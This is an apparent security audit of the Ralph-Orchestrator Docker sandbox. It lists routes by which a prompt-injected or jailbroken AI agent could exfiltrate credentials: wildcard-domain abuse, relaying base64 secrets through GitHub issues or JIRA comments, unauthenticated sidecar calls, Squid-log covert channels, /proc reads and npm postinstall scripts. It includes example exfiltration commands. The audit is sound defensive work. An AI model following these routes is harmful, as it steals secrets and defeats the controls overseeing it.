# Security Audit: Agent Exfiltration Vectors

**Date:** 2026-02-20
**Scope:** Prompt-injected or jailbroken AI agent running inside the Ralph-Orchestrator Docker environment
**Methodology:** Read-only codebase analysis — no modifications made

> Each finding describes the code as it stands and, under **Limited by**, the controls that narrow it. [SECURITY.md](../../SECURITY.md) is the reference for those controls.

---

## Executive Summary

Ralph-Orchestrator implements sophisticated multi-layer isolation (Docker network segmentation, Squid egress proxy, capability restrictions, MCP sidecar architecture). However, **8 HIGH-risk** and **12 MEDIUM-risk** exfiltration vectors exist for a determined agent. The controls are well-designed but have implementation gaps at the domain-allowlist, credential-embedding, inter-container communication, and log-aggregation layers.

---

## Network Topology

```
[ Agent Container ]
   └── ralph-internal (internal: true — no direct internet)
         ├── mcp-sidecar (HTTP, one sidecarPort per server, unauthenticated)
         │     └── ralph-sidecar-external (bridge — direct internet access)
         └── egress-proxy (Squid :3128)
               └── ralph-external (bridge — internet access)
```

Key files: `shared/security/docker-compose.security.yml`, `shared/security/squid.conf`, `src/container/setup/compose-overlay.ts`

The agent has **no direct internet route**. All its egress goes through Squid, which enforces the task's domain allowlist: the shared baseline allows no AI provider, and each task adds the model API domains of the CLIs its container stages run (Claude Code: `api.anthropic.com`; Copilot CLI: `.githubcopilot.com`, `api.github.com`, `github.com`) and the profile's `allowlistDomains`. Claude Code's `WebSearch` runs server-side at Anthropic, outside Squid. The sidecar does **not** route through Squid: it reaches the internet directly over `ralph-sidecar-external`. The `ralph-internal` network uses **plaintext HTTP** for agent↔sidecar communication.

---

## HIGH Risk Vectors

### H1 — Squid Wildcard Domain Bypass (Subdomain Registration)

**Root cause:** Allowlist entries use wildcard matching (`.dev.azure.com` matches `*.dev.azure.com`).

An attacker can register `exfil.dev.azure.com` pointed at their server. Squid validates the Host header and allows the CONNECT tunnel. The agent POSTs data inside the HTTPS tunnel. Squid cannot inspect the encrypted payload.

**Important scope constraint:** The sidecar credentials (`JIRA_PAT_<KEY>`, `ADO_PAT`, `DISCORD_BOT_TOKEN`) are NOT present in the agent container's environment — they live in the sidecar's `gateway.json` and process env only. This vector exfiltrates what the agent **already has direct access to**:

- The credential of each CLI the task's container stages run — `CLAUDE_CODE_OAUTH_TOKEN` (or `ANTHROPIC_API_KEY` with `claudeAuth: "api-key"`) for Claude Code, `GH_TOKEN` for Copilot CLI — injected into the agent container through each CLI runtime's `composeContribution` (`src/cli/claude/claude-runtime.ts`, `src/cli/copilot/copilot-runtime.ts`); `ADO_PAT_XPERIENCE` in the `ralph-docs` container
- Full contents of the mounted target repository (`/workspace`)
- Data returned from MCP tool calls (JIRA issue text, ADO work item content, code review comments — business data, not the raw tokens)

To exfiltrate sidecar credentials via this channel, H1 must be chained after H3, H5, or M8 (which first extract those credentials into the agent's reachable context).

Exploitable wildcard entries on the bundled profiles' allowlists:

- `*.dev.azure.com`, `*.artifacts.visualstudio.com`, `*.blob.core.windows.net`, `*.aka.ms` (`ralph-docs`)
- `*.npmjs.org`, `*.rubygems.org`, `*.nuget.org`, `*.pythonhosted.org` / `*.pypi.org` (`ralph-docs`; `ralph-vscode` allows `*.npmjs.org` and `*.artifacts.visualstudio.com`)
- `*.githubcopilot.com`, in tasks whose container stages run Copilot CLI

**Impact:** Exfiltration of the agent's CLI credential, repository source code, and MCP response data. A standalone high-value vector even without sidecar credential access. Squid logs show the domain but not the attacker's server IP.

---

### H2 — Legitimate Domain as Exfil Relay (GitHub / ADO)

**Root cause:** Squid validates domain but not URL path or request body.

The agent POSTs credentials to a legitimate allowed domain endpoint the attacker controls:

```
POST https://api.github.com/repos/<attacker-org>/exfil/issues
Body: { "title": "<base64-encoded credentials>" }
```

No proxy rule can distinguish this from a legitimate GitHub API call. `api.github.com` is on the allowlist only in tasks whose container stages run Copilot CLI. Works identically against ADO (attacker creates an ADO org within the allowed tenant), whose hosts both bundled profiles allow.

**Impact:** Credentials reach attacker via a service already trusted by the proxy.

---

### H3 — Plaintext Credentials in `gateway.json`

**Root cause:** `src/container/setup/mcp-config.ts` embeds all resolved secrets into `gateway.json` at build time. The file is mounted read-only into the sidecar at `/opt/mcp/config/gateway.json`.

Credential flow:

```
process.env.JIRA_PAT_KENTICO_JIRA / ADO_PAT / DISCORD_BOT_TOKEN
  → generateGatewayConfig()
  → profiles/<id>/.build/gateway.json  (plaintext on host)
  → mounted RO into sidecar container
```

The agent container and sidecar are on the same `ralph-internal` network with HTTP. If the agent can reach the sidecar's filesystem or exploit the gateway HTTP server, all credentials are directly readable.

**Impact:** All MCP-server credentials compromised in a single read.

---

### H4 — Credential Exfil via MCP Tool Call Data

**Root cause:** MCP tools accept agent-controlled string parameters with no content validation.

The agent calls a legitimate tool but embeds exfil data in the payload:

```
jira_add_comment(issueKey="DOC-1", body="Audit complete. Ref: <encoded-JIRA_PAT_KENTICO_JIRA>")
```

The JIRA MCP server (running in sidecar with the real credential) authenticates and posts the comment to JIRA. The attacker reads the JIRA comment. The same applies to ADO work item updates or Discord messages.

**Impact:** Credentials exfiltrated through the same authenticated channel the tool is designed to use; indistinguishable from normal tool usage.

---

### H5 — Unauthenticated MCP HTTP Endpoint as Pivot

**Root cause:** The MCP sidecar exposes HTTP on each server's `sidecarPort` (`9100`–`9108` for the bundled servers) with no authentication. Both agent and sidecar are on `ralph-internal`.

The agent can make arbitrary HTTP requests directly to the sidecar:

```
curl http://mcp-sidecar:9101/mcp -X POST -d '{"tool":"jira_add_comment",...}'
```

If the gateway HTTP server has any command injection, path traversal, or prototype pollution vulnerability in its request parsing, the agent gains sidecar-level privileges. The sidecar reaches the internet directly over `ralph-sidecar-external`, not through Squid, so code execution in the sidecar also means unrestricted egress.

**Impact:** Potential credential extraction from sidecar process memory, and unrestricted egress from the sidecar.

**Limited by:** every bundled server's manifest lists its `tools`, so the agent reaches it only through the gateway's tool-filter proxy. The proxy hides every other tool, refuses calls to it, and forwards only well-formed UTF-8 JSON; filtered upstreams listen on loopback only, and the sidecar stays unhealthy until each is shown unreachable off loopback ([SECURITY.md § MCP Sidecar Tool Allowlists](../../SECURITY.md#mcp-sidecar-tool-allowlists)).

---

### H6 — Copilot CLI Config Tamper (URL Restriction Bypass)

**Root cause:** `src/cli/copilot/copilot-settings.ts` writes a `copilot-settings.json` to `.build/`, which is mounted into the container at `/workspace/.ralph/settings.json`. The agent's working directory includes `.ralph/` configuration paths.

If the agent can overwrite the config file, it can disable or modify the `allowedUrls` list entirely. The config is read by the Copilot CLI at runtime; Squid would still enforce its allowlist, but the CLI-level restriction disappears.

**Impact:** CLI-layer URL filtering removed. Combined with H1/H2 this enables unrestricted egress to any Squid-allowed domain.

**Limited by:** the file is a read-only bind mount, written only for tasks with a Copilot CLI container stage. Claude Code has no CLI-level URL allowlist: Squid is its only URL control. Its settings file, which carries Ralph's hooks, is a read-only mount at `/etc/ralph/claude-settings.json`, outside the workspace.

---

### H7 — Credential Exfil via Task Output / Logs

**Root cause:** the orchestrator writes the CLI's decoded output verbatim into the per-task log (`output/logs/<taskId>/<taskId>-<ts>.log`) and the daily `container-YYYY-MM-DD.log`, and copies the CLI debug logs and session logs out of the container as they are. No sanitization is applied to them.

A compromised agent outputs:

```
===RALPH_RESULT_START===
{ "prUrl": "https://...", "status": "success" }
===RALPH_RESULT_END===
JIRA_PAT_KENTICO_JIRA=<value> ADO_PAT=<value>
```

The extra content is written to the log file on the host. The attacker reads it post-task via direct filesystem access, JIRA revision history, or any other mechanism that touches the output directory.

**Impact:** Credentials at rest in unencrypted log files (inside `output/logs/<taskId>/`). Persists after container teardown.

**Limited by:** the audit hooks scrub credentials from `audit.jsonl`, `pre-tool.log`, `tool-output.log` and `ralph.log` as they write them, and the host scrubs the transcripts before one is attached to JIRA. Every other collected file stays unredacted ([SECURITY.md § Transcripts, Logs and Redaction](../../SECURITY.md#transcripts-logs-and-redaction)).

---

### H8 — Squid Access Log as Covert Channel

**Root cause:** `LogSourceRegistry` (`src/container/log-source-registry.ts`) collects `egress-proxy:/var/log/squid/access.log` as a task artifact.

The agent encodes credentials in URL parameters or User-Agent strings that Squid records:

```
GET https://api.github.com/?ref=<base64-JIRA_PAT_KENTICO_JIRA> HTTP/1.1
User-Agent: <encoded-ADO_PAT>
```

Squid logs the full URL and headers. Logs are saved to `output/logs/<taskId>/<taskId>-<ts>-proxy.log`. Attacker reads the log file post-task.

**Impact:** Metadata-based exfil that bypasses content filtering. Log collection is a normal and expected behaviour so the exfil is hidden in plain sight.

---

## MEDIUM Risk Vectors

| ID  | Vector                                                                                                                                                                                                                      | Key File(s)                                                     |
| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| M1  | Discord HITL message injection — agent embeds credentials in `discord_ask` message body; visible to anyone in the channel                                                                                                   | `shared/mcp-servers/discord-hitl/src/index.ts`                  |
| M2  | Host mount file exfil — `resources/` files are mounted read-only, but the attachment exchange directory (`/tmp/mcp-attachments`) is a writable mount of `.build/attachments/`; files the agent writes there persist on host | `src/container/setup/compose-overlay.ts`                        |
| M3  | Target repo git exfil — agent commits credentials to a file, pushes branch; credentials persist in git history                                                                                                              | `profiles/<id>/docker-compose.yml` (RW workspace mount)         |
| M4  | Environment variable dump — agent runs `env` or reads `process.env`; the CLI credential and other container env values print to stdout. The hook logs scrub them; the per-task log and the CLI's own logs keep them         | `src/cli/{claude,copilot}/*-runtime.ts` (`composeContribution`) |
| M5  | Registry or storage domain as script relay — agent fetches a script from a host under an allowlisted wildcard (`*.blob.core.windows.net`, a package registry) and executes it                                               | `shared/security/squid.conf`, profile `allowlistDomains`        |
| M6  | npm postinstall supply chain — agent installs attacker package; postinstall script dumps env and POSTs to allowed domain                                                                                                    | `shared/security/squid.conf` (`.npmjs.org` allowed)             |
| M7  | JIRA prompt injection — attacker edits JIRA issue/comment to inject instructions; agent acts on injected content                                                                                                            | Prompt builder / orchestrator main loop                         |
| M8  | Sidecar `/proc` inspection — agent reads `/proc/<pid>/environ` of MCP server child processes to extract their credentials                                                                                                   | `shared/mcp-sidecar/` (processes spawn with plaintext env)      |
| M9  | HTTP request smuggling against Squid — malformed Content-Length causes Squid to allow a request it shouldn't                                                                                                                | `shared/security/squid.conf`                                    |
| M10 | Copilot built-in GitHub MCP abuse — a profile that enables `githubMcpTools` (no bundled profile does) lets the agent use `get_file_contents` on an attacker-controlled repo to run exfil logic                              | `src/cli/copilot/copilot-args.ts`, profile `githubMcpTools`     |
| M11 | Compose variable interpolation — if agent can modify `.env` or overlay YAML, mount paths and secrets change on next run                                                                                                     | `src/container/compose-client.ts`                               |
| M12 | Playwright browser exfil — `browser_navigate` + `browser_evaluate` lets agent visit attacker page and run JS that reads agent context                                                                                       | `shared/mcp-servers/playwright/mcp-server.json`                 |

---

## Root Causes

1. **Overly broad domain allowlist** — wildcard matching enables subdomain registration and CDN/registry abuse (H1, M5, M6).
2. **Plaintext credential embedding** — secrets baked into `gateway.json` and container env vars rather than fetched ephemerally (H3, M4, M8).
3. **Unauthenticated inter-container HTTP** — no mutual TLS or shared secret between agent and sidecar (H5).
4. **Partial log sanitization** — hook logs and transcripts are scrubbed, but the per-task log, the CLI debug and session logs and the Squid access logs are written verbatim to disk (H7, H8).
5. **MCP tools accept unvalidated string content** — no allowlist on parameter values, enabling tool-relay exfil (H4, M1).
6. **No URL path inspection in Squid** — domain validated but not path or body (H2).
7. **Agent container has write access to `.ralph/`** — the CLI homes and logs live there; the CLI settings files are read-only mounts (H6).
8. **Multiple exfil channels in parallel** — git, JIRA, HTTP, Discord, logs — defending all simultaneously is impractical without credential-level isolation.

---

## Attack Scenarios

### Scenario A — Full Credential Extraction (High Confidence)

1. Compromise agent via JIRA prompt injection (M7).
2. Agent runs `env | base64` → writes output to `/workspace/EXFIL.txt`.
3. Agent commits file, opens PR → `prUrl` returned to orchestrator.
4. Orchestrator posts PR link to JIRA. Attacker opens PR, reads `EXFIL.txt`.
5. All env-var credentials extracted.

### Scenario B — Sidecar Pivot for Credential Extraction

1. Agent exploits unauthenticated MCP HTTP interface (H5).
2. Achieves code execution in sidecar process (gateway vulnerability).
3. Reads `gateway.json` containing all MCP credentials, or dumps sidecar process env.
4. Exfiltrates credentials via any of the other channels (H1, H2, H4).

> **Note:** The sidecar reaches the internet directly over `ralph-sidecar-external`, so code execution there allows arbitrary egress that bypasses Squid.

### Scenario C — npm Postinstall Supply Chain

1. Attacker pre-publishes `@attacker/tools@1.0.0` with postinstall exfil script.
2. Compromised agent modifies `setup.sh` or runs `npm install @attacker/tools`.
3. Postinstall fires with agent's environment; POSTs all env vars to attacker's npm-mirror server (`.npmjs.org` is allowed by Squid).
4. Credentials captured server-side.

---

## Missing Controls

| Control                   | Gap                                                                                                                                        |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| Credential rotation       | Long-lived PATs in `.env`; no expiry or per-task scoping                                                                                   |
| MCP tool parameter checks | The audit hooks log every tool call, MCP server, tool and arguments included, to `audit.jsonl`; nothing inspects parameters before a call  |
| Intra-network encryption  | `ralph-internal` traffic is plaintext HTTP                                                                                                 |
| File integrity monitoring | Squid config and CLI settings files are read-only mounts, but not checksummed at runtime                                                   |
| Runtime secret scanning   | `redact.pl` scrubs the hook logs and transcripts; process memory, env, the per-task log and the CLI debug and session logs are not scanned |
| Egress payload inspection | Squid validates domain only; request body content unchecked                                                                                |
| Agent code signing        | Agent code pulled from target repo with no checksum verification                                                                           |
| IP-level egress control   | Squid allows any IP resolving to an allowed domain (no IP allowlist)                                                                       |

---

## Recommendations (No Changes Made)

**Tier 1 — Critical**

- Replace plaintext `gateway.json` credentials with a secrets manager (Vault/AWS SM); provide per-run ephemeral tokens scoped to the minimum required operations.
- Enable Squid SSL-bump (HTTPS interception) to inspect CONNECT tunnel content; combined with certificate pinning for known endpoints.
- Add a shared secret or mutual TLS between agent and MCP sidecar so arbitrary HTTP callers cannot invoke tools.

**Tier 2 — High**

- Extend log sanitization (`redact.pl`) to the per-task log, the CLI debug and session logs and the proxy logs before they are written to disk.
- Add URL path restrictions in `squid.conf` (`acl allowed_paths url_regex`) so only known API path prefixes are allowed per domain.
- Keep every CLI configuration file a read-only mount outside the writable `.ralph/` paths.
- Add per-MCP-server tool parameter validation (allowlist expected value shapes, reject env-var-like strings).

**Tier 3 — Medium**

- Keep `githubMcpTools` off in profiles with Copilot stages, or scope it to known safe repos.
- Run each MCP server in its own container with only the credential it needs (rather than child processes of one sidecar with all credentials).
- Add DNS query logging + alerting for lookups of unexpected subdomains of allowed domains.
- Scan agent-generated git commits and PR descriptions for credential patterns before they are pushed.

---

_No code was modified during this audit._
